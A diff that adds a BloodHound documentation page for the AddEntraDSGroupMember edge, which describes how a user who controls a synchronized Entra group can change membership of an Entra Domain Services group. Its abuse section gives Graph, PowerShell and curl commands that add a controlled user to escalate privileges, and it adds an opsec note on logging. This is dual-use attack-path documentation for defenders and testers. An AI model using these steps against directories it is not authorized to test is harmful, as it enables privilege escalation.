@@ -1,0 +1,80 @@
+---
+title: AddEntraDSGroupMember
+description: The Entra user can add or remove principals from the Microsoft Entra Domain Services group through control of its synchronized Entra group.
+---
+
+<img
+  noZoom
+  src="/assets/enterprise-AND-community-edition-pill-tag.svg"
+  alt="Applies to BloodHound Enterprise and CE"
+/>
+
+This relationship indicates that a synchronized Entra user can effectively add or remove members from a Microsoft Entra Domain Services (Entra DS) group by controlling the corresponding synchronized Entra group.
+
+The relationship is composed from three conditions:
+
+1. The Entra user is correlated to an Entra DS user with the [SyncedToEntraDSUser](/resources/edges/synced-to-entra-ds-user) edge.
+2. The Entra user has [AZOwns](/resources/edges/az-owns) or [AZAddMembers](/resources/edges/az-add-members) to an Entra group.
+3. That Entra group is correlated to the destination Entra DS group with the [SyncedToEntraDSGroup](/resources/edges/synced-to-entra-ds-group) edge.
+
+The user can add themselves or another controlled synchronized principal to the Entra group, remove existing members, and wait for the membership change to synchronize into the Entra DS group. Adding membership can grant privileges held by the Entra DS group; removing membership can revoke those privileges from another principal.
+
+Only direct membership in the source Entra group is synchronized. Nested Entra groups do not satisfy this relationship.
+
+## Abuse Info
+
+### Procedure
+
+1. Add a user as a **direct** member of the Entra `AZGroup` that correlates to the destination Entra DS group. Nested group membership does not reach Entra DS.
+
+   ```http
+   POST https://graph.microsoft.com/v1.0/groups/{entra-group-object-id}/members/$ref
+   Content-Type: application/json
+
+   {
+     "@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/{controlled-user-object-id}"
+   }
+   ```
+
+   A successful Microsoft Graph call has no response body:
+
+   ```http
+   HTTP/1.1 204 No Content
+   ```
+
+2. Wait for Entra DS to synchronize the membership and verify the destination group's direct `member` value when LDAP read access is available.
+3. Reauthenticate the controlled user to Entra DS so its logon session or Kerberos ticket contains the newly synchronized group SID.
+
+### Windows command
+
+The Microsoft Graph request in step 1 can be submitted with Microsoft Graph PowerShell:
+
+```powershell
+New-MgGroupMemberByRef -GroupId "<entra-group-object-id>" -OdataId "https://graph.microsoft.com/v1.0/directoryObjects/<member-object-id>"
+```
+
+### Linux command
+
+The Microsoft Graph request in step 1 can be submitted with `curl`:
+
+```bash
+curl -X POST -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
+  https://graph.microsoft.com/v1.0/groups/<entra-group-object-id>/members/\$ref \
+  -d '{"@odata.id": "https://graph.microsoft.com/v1.0/directoryObjects/<member-object-id>"}'
+```
+
+## Opsec Considerations
+
+Modifying Entra group membership generates directory audit logs in Microsoft Entra ID, and the resulting change is replicated into Entra DS, which may produce Windows Logon Events and entries in log solutions when Azure Monitor Diagnostic settings are enabled for Entra DS.
+
+## Edge Schema
+
+Source: [AZUser](/resources/nodes/az-user)<br />
+Destination: [Group](/resources/nodes/group)<br />
+Traversable: **Yes**
+
+## References
+
+- [How objects and credentials are synchronized in a Microsoft Entra Domain Services managed domain](https://learn.microsoft.com/en-us/entra/identity/domain-services/synchronization)
+- [Add members to a group using Microsoft Graph](https://learn.microsoft.com/en-us/graph/api/group-post-members)
+- [MITRE ATT&CK T1098.007: Account Manipulation - Additional Local or Domain Groups](https://attack.mitre.org/techniques/T1098/007/)
